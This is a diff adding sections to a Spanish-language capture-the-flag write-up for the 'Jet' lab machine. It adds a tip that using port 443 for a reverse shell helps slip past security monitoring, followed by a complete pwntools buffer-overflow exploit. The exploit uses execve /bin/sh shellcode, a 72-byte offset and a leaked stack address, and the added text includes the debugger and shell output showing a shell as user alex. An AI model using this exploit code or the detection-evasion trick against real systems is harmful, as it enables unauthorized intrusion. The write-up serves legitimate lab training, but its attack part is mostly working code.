@@ -274,6 +274,8 @@ Connection received on 10.13.37.10
 www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
 ```
 
+`PEQUEÑO APUNTE:` utilizamos el puerto 443 ya que es común que los servidores web manden información por ese puerto, por lo que al mandar información por ese puerto ciertas medidas de seguridad no se fijen en eso y no lo detecten.
+
 Ya estamos dentro! Asi que ahora al ver que archivos hay nos encontramos con otra `flag`:
 
 ```
@@ -326,6 +328,112 @@ Oops, I'm leaking! 0x7ffda13a5490
 Pwn me ¯\_(ツ)_/¯ 
 >
 ```
+
+Vamos a `hostear` el directorio `/home` en el puerto 8000:
+
+```
+www-data@jet:/home$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+Ahora descargaremos el archivo `leak` en nuestra maquina:
+
+```
+❯ wget http://10.13.37.10:8000/leak
+Grabando a: «leak»
+leak                           100%[======================================>]
+«leak» guardado [9112/9112]
+```
+
+Ahora con gdb intentaremos conseguir el offset para empezar a hacer un exploit que explote la vulnerabilidad `buffer overflow`, es decir, que al meterle un input con más caracteres, esos caracteres extra queden por fuera del buffer y se sobreescriban a la información original y así poder inyectar código malicioso.
+
+```
+❯ gdb-peda ./leak
+
+Reading symbols from ./leak...
+(No debugging symbols found in ./leak)
+(gdb-peda) pattern_create 100 pattern
+Writing pattern of 100 chars to filename "pattern"
+(gdb-peda) run < pattern
+Starting program: ~/leak < pattern
+Oops, I'm leaking! 0x7fffffffe600
+Pwn me ¯\_(ツ)_/¯ 
+> 
+Program received signal SIGSEGV, Segmentation fault.
+[--------------------------------------------------------------------]
+(gdb-peda) x/wx $rsp
+0x7fffffffe648: 0x65414149
+(gdb-peda) pattern_offset 0x65414149
+1698775369 found at offset: 72
+(gdb-peda)
+```
+
+Vemos que el `ofset es de 72`, asi que podemos iniciar el exploit ejecutando el programa y almacenando lo que nos lekea:
+
+```
+shell = process("./leak")
+shell.recvuntil(b"Oops, I'm leaking! ")
+leaking = int(shell.recvuntil(b"\n"),16)
+```
+
+Para el payload usaremos un shellcode de exploitdb para ejecutar "`/bin/sh`", después creando el chunk restandole el total de caracteres del shellcode a el offset, y por ultimo agregando la información que nos lekea al ejecutarlo:
+
+```
+payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+payload += b"A"*(72-len(payload))
+payload += p64(leaking)
+```
+
+Por ultimo nos queda que cuando estemos en el input nos queda enviar el payload, `exportar la TERM`:
+
+```
+shell.recvuntil(b"> ")
+shell.sendline(payload)
+shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
+shell.interactive()
+```
+
+El `exploit/playload` se veria asi:
+
+```
+#!/usr/bin/python3
+from pwn import *
+
+shell = remote('10.13.37.10', 9999)
+shell.recvuntil(b"Oops, I'm leaking! ")
+
+leaking = int(shell.recvuntil(b"\n"),16)
+
+payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+payload += b"A"*(72-len(payload))
+payload += p64(leaking)
+
+shell.recvuntil(b"> ")
+shell.sendline(payload)
+shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
+shell.interactive()
+```
+
+Ahora para exponer el binario, lo haremos con socat por el puerto 9999
+
+```
+www-data@jet:~$ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &
+[1] 7231
+```
+
+Para terminar con esto ya simplemente `ejecutamos el exploit` y nos dara la `shell` como el usuario Alex:
+
+```
+❯ python3 leak.py
+[+] Opening connection to 10.13.37.10 on port 9999: Done
+[*] Switching to interactive mode
+
+$ whoami
+alex
+$ cat flag.txt
+JET{0v3rfL0w_f0r_73h_lulz}
+```
+
 
 ## WEB: puerto 80 | http
 
